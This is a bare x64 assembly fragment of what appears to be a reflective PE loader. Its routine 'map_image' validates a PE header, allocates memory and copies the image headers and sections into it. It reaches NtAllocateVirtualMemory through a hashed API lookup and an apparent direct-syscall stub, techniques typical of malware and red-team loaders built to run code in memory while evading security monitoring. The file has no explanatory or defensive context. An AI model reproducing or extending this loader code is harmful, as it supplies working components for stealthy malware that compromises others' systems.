[BITS 64]


map_image:
	push   rbp
	push   rdi
	push   rsi
	push   rbx
	sub    rsp,0x48
	mov    rbp,rcx
	movsxd rdi,DWORD [rcx+0x3c]
	add    rdi,rcx
	mov    eax,0x0
	cmp    DWORD [rdi],0x4550
	jne    loc_1400020b8 
	mov    QWORD [rsp+0x38],0x0
	mov    eax,DWORD [rdi+0x50]
	mov    QWORD [rsp+0x30],rax
	lea    rdx,[rsp+0x38]
	mov    DWORD [rsp+0x28],0x4
	mov    DWORD [rsp+0x20],0x103000
	lea    r9,[rsp+0x30]
	mov    r8d,0x0
	mov    rcx,0xffffffffffffffff
	mov    r10, 0x99CE7C55
	call   api_call
	mov    r10,rax
	call   syscall_api
	;call   rax        ; <NtAllocateVirtualMemory>
	mov    edx,eax
	mov    eax,0x0
	test   edx,edx
	js     loc_1400020b8 
	mov    r8d,DWORD [rdi+0x54]
	mov    rdx,rbp
	mov    rcx,QWORD [rsp+0x38]
	call   memcpy
	movzx  eax,WORD [rdi+0x14]
	lea    rbx,[rdi+rax*1+0x18]
	cmp    WORD [rdi+0x6],0x0
	je     loc_1400020b3 
	mov    esi,0x0
loc_14000208d:
	mov    ecx,DWORD [rbx+0xc]
	add    rcx,QWORD [rsp+0x38]
	mov    edx,DWORD [rbx+0x14]
	add    rdx,rbp
	mov    r8d,DWORD [rbx+0x10]
	call   memcpy
	add    esi,0x1
	add    rbx,0x28
	movzx  eax,WORD [rdi+0x6]
	cmp    eax,esi
	jg     loc_14000208d 
loc_1400020b3:
	mov    rax,QWORD [rsp+0x38]
loc_1400020b8:
	add    rsp,0x48
	pop    rbx
	pop    rsi
	pop    rdi
	pop    rbp
	ret